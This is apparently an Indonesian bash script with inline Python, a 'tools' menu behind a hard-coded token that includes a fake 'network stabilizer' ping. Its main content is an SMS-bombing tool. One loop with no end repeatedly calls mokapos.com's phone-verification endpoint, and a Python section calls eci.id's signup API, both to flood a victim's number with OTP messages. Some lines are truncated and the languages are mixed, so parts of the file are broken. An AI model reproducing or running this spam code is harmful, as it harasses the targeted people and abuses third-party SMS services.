clear

#logo

figlet Tools Sc

#password
	read -p "[∆]Sudah Download Token? jika belum bisa minta ke 081387603153 JIKA SUDAH KLICK ENTER >>> " username
	read -p "[∆]Masukan Token   : " pass

echo $pass $username
sleep 3
echo
if [ $pass = "RizqiGTG" ]
	then
	echo [✓]"Token Valid"
	sleep 3
clear
	else
	echo [X]"Token Salah"
	echo [X]"Ulangi Lagi"
	sleep 3
	bash Tools.sh
	sleep 4

fi
sleep 2

#logo

figlet Tools Rizqi
	echo
	echo [1]"---STABILKAN JARINGANMU--- "
	echo [2]"---SPAMER SMS 2022----- "
	echo [3]"---ERROR!!---"
	echo [4]"---ERROR!!---"
	echo
	read -p "PILIH TOLS--->> : " bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear

figlet Stabil
echo
echo $"STABILKAN SINYAL ANDA"
sleep 4
echo $"Loading..."
echo $"Hentikan Dengan CTRL+Z"
sleep 3
echo
ping -s1000 1.1.1.1
fi


if [ $bro = 2 ] || [ $bro = 2 ] 
then
clear
fi

b="\033[34;1m"
 p="\033[39;1m"
  k="\033[33;1m"
   m="\033[31;1m"
    h="\033[32;1m"
     c="\033[35;1m"
      pu="\033[36;1m"
       x="\033[30;1m"
        o="\033[0m"
        JAM=`date +%H`
          MENIT=`date +%M`
            DETIK=`date +%S`
             TANGGAL=`date +%d`
           BULAN=`date +%m`
        TAHUN=`date +%Y`
        
        load(){
        printf "\t ${p}[${c}•${p}]${pu}Proses Spaming${h}"
        sleep 0.5
        printf "."
        sleep 0.5
        printf "."
        sleep 0.5
        printf "."
        sleep 0.5
        printf ".\n"
        }

function check(){
		if [ -z $(command -v curl) ];then
		printf "${p}[${m}!${p}]${m}curl belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install curl\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi
		
		if [ -z $(command -v bash) ];then
		printf "${p}[${m}!${p}]${m}bash belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install bash\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi
		
}
check
clear
echo -e "\t${p}__________________________"
echo -e "\t${h}|   ✓ SPAMER SMS 2022 ✓   |"
echo -e "\t${p}| ✓  Author${m}: ${x}RIZQIMBMBG ✓ |"
echo -e "\t${p}| ✓ Team${m}: ${p,}WHITERS INDOK ✓ |"
echo -e "\t${p}__________________________"
echo -e "\t${m}    { ${x}(Gunakan Awalan 08) ${m}} \n"
function spam(){
for (( loop = 1; loop <= loop; loop++ ));do
	get=$( curl -s --http2 -X POST \
	-H "accept:application/json, text/plain, */*" \
	-H "authorization:undefined" \
	-H "save-data:on" \
	-H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" \
	-H "content-type:application/json;charset=UTF-8" -d '{"phone_number":"'"$number"'"}' "https://service.mokapos.com/account/v1/verification/phone/send" | grep -Eo -i "ok" | tr "OK" "rus" | awk {'print $1"s"'})
	
	if [[ $get =~ "rus" ]];then
	printf "${p}[${h}•${p}] MENGIRIM SMS KE? ${pu}$number ${m}[${h} Berhasil ${m}]\n"
	fi
done
}

function __main__(){
	printf "\t${b}╔════════════════════════╗ \n"
    printf "\t${b}║${p}NO TARGET${m}:${pu} " number
    read number;
    printf "\t${b}╚════════════════════════╝\n"    
  	ko=$(echo -e "$number" | grep -Eo "7166")
  	kop=$(echo -e "$number" | grep -Eo "7622")
  	if [[ ${ko} =~ "7166" ]];then
  		echo -e "\t${p}[${m}!${p}] ${k}Gak Sopan Mau Spam Admin ${m}!!\n"
  		exit
  	elif [[ ${number} =~ "7622" ]];then
  		echo -e "\t${p}[${m}!${p}] ${k}Gak Sopan Mau Spam Admin ${m}!!\n"
  		exit
  	fi
    if [[ ${number:0:2} =~ "0" ]]; then
    printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
    number="+62${number:1:15}"
    spam $number
    elif [[ ${number:0:2} =~ "62" ]]; then
    printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
    number="+${number:0:15}"
    spam $number
    elif [[ ${number:0:3} =~ "+62" ]]; then
    printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
    number="$number"
    spam $number
    else 
    printf "\t${p}[${m}!${p}] ${m}Invalid Number!!\n\n"
    exit 1
    fi
}
__main__
fi



if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
fi

import time, requests,json,os

os.system("clear")

print(" Author : Rizqi ")
print(" Team   : White Str ")
print(" Github : RiskiMbmbng ")
time.sleep(2.4)
nomer = input("Nomer Target Berawal (8xx) > ")
time.sleep(2)
jumlah = int(input("Masukan Jumlah Spam (5) > "))
time.sleep(3)
headers = {
"Host" : "eci.id",
"Connection" : "keep-alive",
"Content-Length" : "27",
"Accept" : "application/json, text/plain, */*",
"Origin" : "https://eci.id",
"User-Agent" : "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G>
"Content-Type" : "application/json",
"Referer" : "https://eci.id/register",
"Accept-Encoding" : "gzip, deflate, br",
"Accept-Language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

data = json.dumps({"identity":"0"+nomer})
for i in range(jumlah):
        pos = requests.post("https://eci.id/api/signup",headers=heade>

if "success" in pos:
    print("Spam Masuk Ke Target ",)

else:
    print("Spam Gagal ",)

fi



if [ $bro = 4 ] || [ $bro = 4 ]
then
clear
fi


R='\x1b[1;31m'

G='\x1b[1;32m'

B='\x1b[1;34m'

Y='\x1b[1;33m'

C='\x1b[1;36m'

D='\x1b[0m'

function Percent(){

   message="$1"

   max=$2

   #make loop

   while true; do

       i=1

       while [ $i -le $max ]; do

           echo -ne "\r${G}[✓]${C} $message ${G}$i${D} %"

           #Percent "Loading..." 100

           if [ $i -eq 100 ]; then

               echo -ne "${G} [done boskuh!]${D}\n"

               Percent "Loading..." 100

fi

         

           let i++

       done

   done

}

Percent "Loading..." 100 


